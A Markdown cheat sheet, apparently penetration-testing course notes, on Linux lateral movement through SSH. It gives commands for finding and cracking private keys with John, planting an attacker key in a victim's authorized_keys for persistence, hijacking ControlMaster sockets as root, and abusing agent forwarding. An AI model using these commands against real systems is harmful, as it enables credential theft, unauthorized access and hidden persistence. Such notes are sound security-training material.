# Linux Lateral Movement
## Lateral Movement with SSH
### SSH Keys
| Info | Command |
|:-----|:--------|
| Search for ssh key | `find /home/ -name "id_rsa"` |
| Search for files in the home directory | `cd $home; ls -al` |
| Search for other hosts keys may work on (File may be hashed) | `cat ~/.ssh/known_hosts` |
| Search bash history for other hosts connected to with SSH and the same key | `tail .bash_history` |
| Dump SSH key hash with John | `python /usr/share/john/ssh2john.py svuser.key > svuser.hash` |
| Crack SSH key hash with John | `sudo john --wordlist=/usr/share/wordlists/rockyou.txt ./svuser.hash` |

**Example Encrypted Key**
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,351CBB3ECC54B554DD07029E2C377380
```

### SSH Persistence
| Info | Command |
|:-----|:--------|
| Generate SSH Key | `ssh-keygen` |
| Copy SSH Key to authorized_keys file | `echo "ssh-rsa AAAAB3NzaC1yc2E....ANSzp9EPhk4cIeX8= kali@kali" >> /home/linuxvictim/.ssh/authorized_keys` |
| Set permissions on authorized_keys file if required | `chmod 644 .ssh/authorized_keys` |

### SSH Hijacking with Controlmaster
| Info | Command |
|:-----|:--------|
| Create config file | `nano ~/.ssh/config` |
| Change file permissions | `chmod 644 ~/.ssh/config` |
| Create the required controlmaster directory | `mkdir ~/.ssh/controlmaster` |
| Show sockets | `ls -al ~/.ssh/controlmaster/` |
| Any listed sockets will be available via ssh without a password | `ssh offsec@linuxvictim` |
| Hijack the socket using root | `ssh -S /home/offsec/.ssh/controlmaster/offsec\@linuxvictim\:22 offsec@linuxvictim` |

**Example .ssh/config file**
```
Host *
    ControlPath ~/.ssh/controlmaster/%r@%h:%p
    ControlMaster auto
    ControlPersist 10m
```
### SSH Hijacking Using SSH-Agent and SSH Agent Forwarding
| Info | Command |
|:-----|:--------|
| Copy public key to intermediate server | `ssh-copy-id -i ~/.ssh/id_rsa.pub offsec@controller` |
| Copy public key to victim server | `ssh-copy-id -i ~/.ssh/id_rsa.pub offsec@linuxvictim` |
| On Kali Ensure 'ForwardAgent yes' is set in SSH config file | `nano ~/.ssh/config` |
| On intermediate server set 'AllowAgentForwarding yes' in SSH config file | `nano /etc/ssh/sshd_config` | 
| Start SSH agent on Kali | `` eval `ssh-agent` `` |
| Add SSH keys to kali | `ssh-add` |

## DevOps
